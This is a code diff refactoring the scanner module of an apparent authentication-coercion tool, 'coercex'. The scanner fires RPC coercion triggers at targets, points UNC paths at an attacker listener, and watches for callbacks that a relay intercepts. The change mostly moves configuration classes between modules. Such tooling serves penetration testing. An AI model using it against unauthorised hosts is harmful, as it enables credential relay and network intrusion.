@@ -19,73 +19,28 @@ from __future__ import annotations
 import asyncio
 import logging
 import time
-from dataclasses import dataclass, field
-from enum import Enum, auto
 
 from rich.console import Console
 
-from coercex.connection import DCERPCPool, trigger_method
+from coercex.connection import DCERPCPool
 from coercex.listener import AsyncListener
 from coercex.methods import get_all_methods
 from coercex.methods.base import CoercionMethod, PipeBinding
 from coercex.redirect import PortRedirector, setup_redirect
-from coercex.utils import (
+from coercex.models import (
     Credentials,
+    Mode,
+    ScanConfig,
     ScanResult,
     ScanStats,
+    STATUS_STYLE,
     Transport,
     TriggerResult,
-    build_unc_path,
-    get_local_ip,
-    random_string,
 )
+from coercex.net import get_local_ip, random_string
+from coercex.unc import build_unc_path
 
 log = logging.getLogger("coercex.scanner")
-
-# ── Rich status styling ─────────────────────────────────────────────
-_STATUS_STYLE = {
-    TriggerResult.VULNERABLE: ("bold green", "[+]"),
-    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
-    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
-    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
-    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
-    TriggerResult.TIMEOUT: ("magenta", "[T]"),
-    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
-    TriggerResult.SENT: ("cyan", "[>]"),
-}
-
-
-class Mode(Enum):
-    SCAN = auto()
-    COERCE = auto()
-
-
-@dataclass
-class ScanConfig:
-    """Configuration for a scan run."""
-
-    targets: list[str]
-    mode: Mode = Mode.SCAN
-    protocols: list[str] | None = None
-    methods_filter: list[str] | None = None  # Glob/regex patterns for method names
-    pipes_filter: list[str] | None = None  # Pipe names to restrict to
-    creds: Credentials | None = None
-    listener_host: str = ""  # Attacker IP (empty = no listener)
-    http_port: int = 80
-    smb_port: int = 445
-    transport: set[Transport] = field(
-        default_factory=lambda: {Transport.SMB, Transport.HTTP}
-    )
-    concurrency: int = 50
-    timeout: int = 5
-    callback_timeout: float = 3.0
-    redirect: bool = False
-    verbose: bool = False
-
-    @property
-    def has_listener(self) -> bool:
-        """Whether a listener IP was provided."""
-        return bool(self.listener_host)
 
 
 class Scanner:
@@ -143,7 +98,6 @@ class Scanner:
             f"concurrency=[bold]{self.config.concurrency}[/]"
         )
 
-        # ── Port redirect (iptables / pydivert) ────────────────────────
         needs_redirect = self.config.redirect and (
             self.config.smb_port != 445 or self.config.http_port != 80
         )
@@ -215,8 +169,6 @@ class Scanner:
                 self.console.print("[dim]Port redirect rules removed[/]")
 
         return self.stats
-
-    # ── SCAN: all path styles (fuzz-like thoroughness) ──────────────
 
     async def _run_scan(self, methods: list[CoercionMethod]) -> None:
         """Scan mode: try all path styles per method to detect vulnerabilities."""
@@ -313,7 +265,10 @@ class Scanner:
 
             # Fire the trigger — we don't care about the RPC response
             try:
-                await asyncio.to_thread(method.trigger_fn, dce, path, target)
+                trigger_fn = method.trigger_fn
+                if trigger_fn is None:
+                    raise ValueError(f"No trigger function for {method.function_name}")
+                await asyncio.to_thread(trigger_fn, dce, path, target)
             except Exception:
                 pass  # Expected: relay intercepts auth, RPC call fails
 
@@ -329,8 +284,6 @@ class Scanner:
             )
             self.stats.add(result)
             self._emit(result)
-
-    # ── Core attempt logic (scan mode) ────────────────────────────
 
     async def _attempt(
         self,
@@ -354,7 +307,7 @@ class Scanner:
                 path = build_unc_path(
                     "127.0.0.1", "coercexscan", transport, path_style=path_style
                 )
-                result = await trigger_method(pool, target, method, binding, path)
+                result = await pool.trigger_method(target, method, binding, path)
             else:
                 # Listener active: real path with correlation token
                 listener = self._listener
@@ -375,7 +328,7 @@ class Scanner:
                 # even if FIFO assigned them to the wrong token.
                 t_before = time.monotonic()
 
-                result = await trigger_method(pool, target, method, binding, path)
+                result = await pool.trigger_method(target, method, binding, path)
 
                 # Wait for callback if trigger indicated vulnerability
                 if result.result in (
@@ -429,7 +382,7 @@ class Scanner:
             TriggerResult.SENT,
         )
         if show:
-            style, sym = _STATUS_STYLE.get(result.result, ("dim red", "[?]"))
+            style, sym = STATUS_STYLE.get(result.result, ("dim red", "[?]"))
             cb = " [bold green](callback!)[/]" if result.callback_received else ""
             tr = f" [dim]({result.transport})[/]" if result.transport else ""
             auth = f" [bold magenta]{result.auth_user}[/]" if result.auth_user else ""
